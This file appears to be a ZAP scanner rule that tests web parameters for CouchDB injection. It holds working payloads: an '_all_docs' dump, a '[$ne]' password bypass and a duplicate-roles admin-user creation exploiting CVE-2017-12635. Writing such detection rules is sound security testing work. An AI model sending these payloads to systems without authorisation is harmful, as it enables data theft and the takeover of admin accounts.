/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2018 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesAlpha;

import net.sf.json.JSONArray;
import net.sf.json.JSONException;
import net.sf.json.JSONObject;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.core.scanner.NameValuePair;
import org.parosproxy.paros.network.HttpMessage;

import java.io.IOException;

/**
 * The CouchDB Injection scan rule identifies CouchDB injection vulnerabilities
 *
 * @author Matteo_Pappadà
 */
public class CouchDbInjectionScanRule extends AbstractAppParamPlugin {

    // Prefix for internationalised messages used by this rule
    private static final String MESSAGE_PREFIX = "ascanalpha.couchdb.";
    private static final Logger LOG = LogManager.getLogger(CouchDbInjectionScanRule.class);

    // Global variables
    private int isGetMsg;

    // Constants
    private static final String ALL_DOCS = "alldocs";
    private static final String LOGIN = "login";
    private static final String INSERT_USER = "insertuser";
    private static final String ATTACK_ADMIN = "roles: [\"_admin\"] + roles: [\"\"] -> Attack (CVE-2017-12635)";
    private static final String pwdInjSuffix = "[$ne]";
    private static final String allDocsInjSuffix = "[]";
    private static final String allDocsValue = "_all_docs";
    private static final String allDocsProp = "rows";
    private static final String adminUser = "{\"name\": \"ZAP\", \"password\": \"ZAP\", \"roles\": [\"_admin\"], \"roles\": [], \"type\": \"user\"}";
    //private static final String[] LOGIN_VALUES = new String[] {"login", "Login", "log in", "Log in", "logged", "Logged"};
    private static final String[] INSERT_USER_VALUES = new String[] {"ok", "conflict"};

    @Override
    public int getId() {
        return 40041;
    }

    @Override
    public String getName() {
        return Constant.messages.getString(MESSAGE_PREFIX + "name");
    }

    @Override
    public String getDescription() {
        return Constant.messages.getString(MESSAGE_PREFIX + "desc");
    }

    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    @Override
    public String getSolution() {
        return Constant.messages.getString(MESSAGE_PREFIX + "soln");
    }

    @Override
    public String getReference() {
        return Constant.messages.getString(MESSAGE_PREFIX + "refs");
    }

    public String getExtraInfo(String attack) {
        return Constant.messages.getString(MESSAGE_PREFIX + "extrainfo." + attack);
    }

    @Override
    public void init() {
        LOG.debug("Initialising CouchDB penetration tests");
        isGetMsg = -1;
    }

    @Override
    public void scan(HttpMessage msg, NameValuePair originalParam) {
        isGetMsg = msg.getRequestHeader().getMethod().compareTo("GET");
        super.scan(msg, originalParam);
    }

    @Override
    public void scan(HttpMessage msg, String param, String value) {
        boolean isInsertUser = true;
        HttpMessage msgInjAttack;

        // injection attack for keyword _all_docs
        try {
            msgInjAttack = getNewMsg();

            setParameter(msgInjAttack, param + allDocsInjSuffix, allDocsValue);
            //System.out.println(msgInjAttack.getRequestHeader().toString() + msgInjAttack.getRequestBody().toString());
            sendAndReceive(msgInjAttack, false);
            boolean isJSONObject = true;
            JSONObject bodyAllDocs = null;
            try{
                bodyAllDocs = JSONObject.fromObject(msgInjAttack.getResponseBody().toString());
            } catch (JSONException ex){
                isJSONObject = false;
            }
            JSONArray docs = null;
            if(isJSONObject)
                docs = bodyAllDocs.optJSONArray(allDocsProp);
            else
                try{
                    docs = JSONArray.fromObject(msgInjAttack.getResponseBody().toString());
                } catch (JSONException ignored){}

            if (msgInjAttack.getResponseHeader().getStatusCode() == 200 && docs != null) {
                //System.out.println(msgInjAttack.getRequestHeader().toString());
                newAlert()
                        .setConfidence(Alert.CONFIDENCE_HIGH)
                        .setParam(param)
                        .setAttack(param + allDocsInjSuffix)
                        .setOtherInfo(getExtraInfo(ALL_DOCS))
                        .setMessage(msgInjAttack)
                        .raise();
                isInsertUser = false;
            }


        } catch (IOException ex) {
            LOG.debug("Caught {}: {}", ex.getClass().getName(), ex.getMessage());
            return;
        }

        // injection attack on password bypass
        try {
            HttpMessage msgCounterProof = getNewMsg();
            msgInjAttack = getNewMsg();

            sendAndReceive(msgCounterProof, false);

            setParameter(msgInjAttack, param + pwdInjSuffix, value);
            //System.out.println(msgInjAttack.getRequestHeader().toString() + msgInjAttack.getRequestBody().toString());
            sendAndReceive(msgInjAttack, false);

            /*boolean isJSONObject = true;
            JSONObject bodyLogin = null;
            try {
                bodyLogin = JSONObject.fromObject(msgInjAttack.getResponseBody().toString());
            }catch (JSONException ex) {
                isJSONObject = false;
            }

            boolean isLogged = false;
            if(isJSONObject){
                for(String propertyName: LOGIN_VALUES){
                    isLogged = bodyLogin.optBoolean(propertyName, false);
                    if(isLogged)
                        break;
                }
            }*/

            if (
                    (msgCounterProof.getResponseHeader().getStatusCode() == 200 ||
                    msgInjAttack.getResponseHeader().getStatusCode() == 200)
                    &&
                    msgInjAttack.getResponseBody().toString()
                    .compareTo(msgCounterProof.getResponseBody().toString()) != 0
            ) {
                //System.out.println(msgInjAttack.getRequestHeader().toString());
                newAlert()
                        .setConfidence(Alert.CONFIDENCE_HIGH)
                        .setParam(param)
                        .setAttack(param + pwdInjSuffix)
                        .setOtherInfo(getExtraInfo(LOGIN))
                        .setMessage(msgInjAttack)
                        .raise();
                isInsertUser = false;
            }


        } catch (IOException ex) {
            LOG.debug("Caught {}: {}", ex.getClass().getName(), ex.getMessage());
            return;
        }

        if(isGetMsg != 0 && isInsertUser) {
            // trying to create an admin user
            try {
                msgInjAttack = getNewMsg();

                setParameter(msgInjAttack, param, adminUser);
                //System.out.println(msgInjAttack.getRequestHeader().toString() + msgInjAttack.getRequestBody().toString());
                sendAndReceive(msgInjAttack, false);

                String bodyInsertUser = msgInjAttack.getResponseBody().toString();

                if (bodyInsertUser.contains(INSERT_USER_VALUES[0]) ||
                        bodyInsertUser.contains(INSERT_USER_VALUES[1])) {
                    //System.out.println(msgInjAttack.getRequestHeader().toString());
                    newAlert()
                            .setConfidence(Alert.CONFIDENCE_HIGH)
                            .setParam(param)
                            .setAttack(ATTACK_ADMIN)
                            .setOtherInfo(getExtraInfo(INSERT_USER))
                            .setMessage(msgInjAttack)
                            .raise();
                }


            } catch (IOException ex) {
                LOG.debug("Caught {}: {}", ex.getClass().getName(), ex.getMessage());
            }
        }
    }
}
